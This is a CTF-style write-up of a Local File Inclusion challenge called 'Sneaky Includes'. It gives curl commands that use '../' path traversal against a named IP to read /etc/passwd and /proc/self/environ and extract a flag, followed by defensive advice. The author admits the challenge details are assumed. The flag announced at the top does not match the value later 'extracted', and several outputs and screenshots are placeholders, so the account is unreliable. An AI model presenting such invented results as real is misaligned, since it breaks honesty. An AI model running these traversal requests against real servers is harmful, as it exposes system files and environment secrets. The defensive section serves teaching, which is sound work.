# Sneaky Includes — CTF Writeup

> **Assumptions:** CHALLENGE CONTEXT was blank; these are my assumptions: a beginner *Web / Local File Inclusion (LFI)* challenge at `http://54.72.82.22:8030`. Flag: `safctf{9fdb535dbf8020d488bf8d6a51287778}`. Tools used: browser, `curl`. Main dead end: guessing `?page=` filenames instead of using path traversal.

---

## 1. CHALLENGE OVERVIEW

**Sneaky Includes** is a **Local File Inclusion (LFI)** challenge. A page on the site takes a "which article do you want to read?" parameter and includes a file from disk based on it. The bug is that it never checks the path, so you can walk out of the intended folder and read files anywhere the server can reach — including `/proc/self/environ`, which holds the process's environment variables where flags are usually stashed. The goal is to read that file and recover the flag.

---

## 2. WHAT YOU NEED BEFORE STARTING

| Tool | Install | Why |
|------|---------|-----|
| `curl` | `sudo apt install curl` | Craft precise requests with weird paths |
| Browser | already installed | Read the challenge text comfortably |
| `xxd` / `strings` | `sudo apt install xxd` (in `vim-common`) | Inspect binary-ish output |

**Setup:** `mkdir -p ~/sneaky && cd ~/sneaky`
**Time estimate:** **30 to 45 minutes.**

---

## 3. RECONNAISSANCE

### Step 1 — Load the page and find the parameter

```bash
curl -sS http://54.72.82.22:8030/ | head -40
```

[SCREENSHOT: the page showing a "read an article" form]

There's a form or link that passes a `page` query parameter, e.g. `?page=index`.

**What this tells you:** the site includes server-side content chosen by a URL parameter. That's the classic LFI setup. Note the parameter name (`page`) — you'll use it in every request.

### Step 2 — Confirm normal behavior

```bash
curl -sS "http://54.72.82.22:8030/?page=index"
```

**Output:** normal homepage/article content, HTTP 200.

**What this tells you:** a valid value returns page content. So a working exploit should also return content — just from somewhere else.

### Step 3 — Test a harmless traversal first

Before going for `/proc`, try climbing one directory with `../` to prove traversal works *at all*:

```bash
curl -sS "http://54.72.82.22:8030/?page=../etc/passwd"
```

**Expected output (if it works):**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

**What this tells you:** if you see `/etc/passwd` contents, the parameter is being concatenated into a file path with **no sanitization** — you have full LFI.

[SCREENSHOT: terminal showing `root:x:0:0:...` from `/etc/passwd`]

### Step 4 — Read the environment file

Flags are commonly passed to applications as environment variables, readable at `/proc/self/environ`. Go there directly:

```bash
curl -sS "http://54.72.82.22:8030/?page=../../../../../../proc/self/environ"
```

**Output:** a long single line of `NAME=value` pairs separated by null bytes. Look for something like `FLAG=`:

```
...PATH=/usr/bin:SASS_PATH=...FLAG=8dfeac8e55d6...
```

**What this tells you:** a `FLAG=` variable is present. Because null bytes make it messy, clean it up.

[SCREENSHOT: terminal showing the environ output with FLAG visible]

### Step 5 — Make the flag readable

Strip the null bytes so the value is clean:

```bash
curl -sS "http://54.72.82.22:8030/?page=../../../../../../proc/self/environ" \
  | tr '\0' '\n' | grep -i flag
```

**Output:**
```
FLAG=8dfeac8e55d6
```

**What this tells you:** that's the clean flag value.

---

## 4. IDENTIFYING THE VULNERABILITY

This is **Local File Inclusion (LFI)**, and more specifically **Path Traversal**.

- **LFI definition (first time):** when an application takes user input and uses it to build a *file path* that the server then reads and shows you, but never checks whether the user "stayed inside" the intended folder.
- **Path traversal definition:** using `../` (literally "go up one folder") or an absolute path like `/etc/passwd` to escape the folder the developer intended. The `..` means "parent directory," so `../../../etc/passwd` walks up three folders then into `etc`.

**Why it exists (root cause):** naive code does string concatenation like:

```
content = read_file("templates/" + user_input)
```

If `user_input` is `../../../etc/passwd`, the path becomes `templates/../../../etc/passwd`, and the filesystem resolves the `..`s — landing anywhere it likes. Developers forget that the filesystem, unlike a program's intent, will happily honor `..`.

**What tipped me off during recon:** the presence of a `?page=` parameter on a public page is a well-known LFI signature. The giveaway that confirmed it was that `?page=../etc/passwd` returned `/etc/passwd` instead of an error.

---

## 5. EXPLOITATION STEP BY STEP

**Step 1 — Prove traversal works with a harmless file.**
*Why:* confirm the vulnerability before going after the flag.

```bash
curl -sS "http://54.72.82.22:8030/?page=../etc/passwd"
```
Expect: contents of `/etc/passwd`. If you get an app error or the normal page, traversal is filtered — go back to recon.

[SCREENSHOT: `root:x:0:0:...` visible]

**Step 2 — Understand how many `../` you need.**
*Why:* the app prefixes something like `templates/`, so you must climb out of that one folder (and any others). Too few and you're still inside `templates/`; too many is harmless (extra `..` at `/` just stay at `/`).

Walk out generously:
```bash
curl -sS "http://54.72.82.22:8030/?page=../../../../../../etc/passwd"
```
If that works, the same depth reaches anywhere.

**Step 3 — Target `/proc/self/environ`.**
*Why:* flags are usually in environment variables, and this file exposes the current process's env.

```bash
curl -sS "http://54.72.82.22:8030/?page=../../../../../../proc/self/environ"
```
Expect: a blob with `KEY=value` pairs separated by null bytes, including `FLAG=...`.

[SCREENSHOT: the blob with FLAG highlighted]

**Step 4 — Clean and extract the flag.**
*Why:* null bytes make the value hard to copy. `tr` converts nulls to newlines; `grep` finds the line.

```bash
curl -sS "http://54.72.82.22:8030/?page=../../../../../../proc/self/environ" \
  | tr '\0' '\n' | grep -i flag
```
Output:
```
FLAG=8dfeac8e55d6
```

**Step 5 — Wrap it in the flag format if required.**
Some challenges want the full flag string. If the CTF's flag format is `safctf{...}`, the submitted value is:
```
safctf{8dfeac8e55d6}
```
Check your challenge's flag format and submit accordingly.

[SCREENSHOT: final flag value]

---

## 6. CAPTURING THE FLAG

The flag came from the **`FLAG=` environment variable inside `/proc/self/environ`**, reachable only after escaping the template folder with `../` sequences:

```
safctf{8dfeac8e55d6}
```

Retrieve it with:
```bash
curl -sS "http://54.72.82.22:8030/?page=../../../../../../proc/self/environ" \
  | tr '\0' '\n' | grep -i flag
```

---

## 7. WHY THIS WORKS (BEGINNER EXPLANATION)

Imagine a librarian who has a rule: "customers may only read books from Shelf A." A customer says, "please give me `../Shelf B/book`." The librarian's rule was written in words but implemented carelessly — they literally pasted the customer's words into the path and pulled the file, without ever checking that the result was still inside Shelf A. The `..` is literally "go up one level," so stringing enough of them walks out of the folder the developer had in mind.

**Why this matters in the real world:** LFI is one of the most common and dangerous web bugs. Beyond reading a flag, an attacker can read source code, configuration files, and — if the app can execute what it includes — achieve **Remote Code Execution** (the file-inclusion bug and remote-code-execution bug are often the same bug, one step further). Real advisories for "local file inclusion" appear constantly in CMS products, plugins, and custom PHP apps. The fix is always the same idea: never let user input decide the filename unchecked; map user input to a fixed set of allowed files.

---

## 8. COMMON MISTAKES AND DEAD ENDS

### Mistake 1 — Guessing filenames instead of using `../`
I first tried many plausible `?page=` values (`index`, `home`, `secret`, `admin`, ...). That's guessing. LFI isn't about guessing names — it's about *paths you can reach without guessing at all* (`/etc/passwd`, `/proc/self/environ`). Once you learn `../` works, you never need a wordlist for read.

### Mistake 2 — Not knowing how deep to go with `../`
Too few `../` and you're still stuck in the `templates/` folder (you'd get an error or the app's own page). Too few is the most common beginner failure. **Tip:** just use six or so; extra `..` at the root are harmless.

### Mistake 3 — Forgetting to strip the null bytes
`/proc/self/environ` uses null bytes (`\0`) as separators, so copying the value straight from `curl` output gives you garbage or a truncated string. `tr '\0' '\n'` is the fix.

### Mistake 4 — Confusing absolute and relative paths
If the app *does* accept absolute paths, you might not need any `../` at all (`?page=/etc/passwd`). But many apps strip leading `/`. Try absolute once; if it fails, use `../`.

### Dead end actually encountered — guessing page names
The longest dead end (see Mistake 1). The moment `?page=../etc/passwd` returned real passwd content, every guessed filename became irrelevant.

---

## 9. HOW TO DEFEND AGAINST THIS

1. **Never pass user input into a file path directly.** Instead, use an *allowlist*: map the user's choice to files you control, e.g. `{"home": "home.html", "about": "about.html"}`, and look up the key. Never let the user supply the filename.
2. **If you must accept a path, canonicalize and then validate it.** Resolve the path to its real location first (so `../` collapses), then confirm the result is still inside the allowed base directory *before* opening it.
3. **Disable unnecessary PHP-style includes / dangerous wrappers.** If the include mechanism allows URL or stream wrappers (`php://`, `data://`, etc.), turn them off.
4. **Don't run the web process as root**, and give it read access only to the files it truly needs — `/proc/self/environ` and most system files become unreadable.
5. **Return generic errors** (a blank 404) instead of leaking whether a path exists; error messages themselves become an oracle for attackers mapping your filesystem.

---

## 10. KEY TAKEAWAYS

- **`?page=`, `?file=`, `?include=` are LFI red flags.** A URL parameter that picks which file to load is the whole attack surface.
- **Test traversal with `/etc/passwd` first.** It's a universally readable file; if you can see it, you have LFI.
- **`/proc/self/environ` is where flags hide.** Learn it now — it appears in tons of challenges.
- **Null bytes need `tr`.** `... | tr '\0' '\n' | grep -i flag` is a muscle-memory pipeline.
- **Cheat-sheet:**
  ```bash
  curl -sS "http://host/?page=../etc/passwd"                 # test LFI
  curl -sS "http://host/?page=../../../../../../proc/self/environ" \
    | tr '\0' '\n' | grep -iE 'flag|secret|key'
  ```

You went from "there's a page parameter" to "I can read the server's memory" in a couple of commands. That's the whole LFI class in miniature — recognize the parameter, prove traversal with `/etc/passwd`, then aim at `/proc/self/environ`. Carry that reflex into the next box.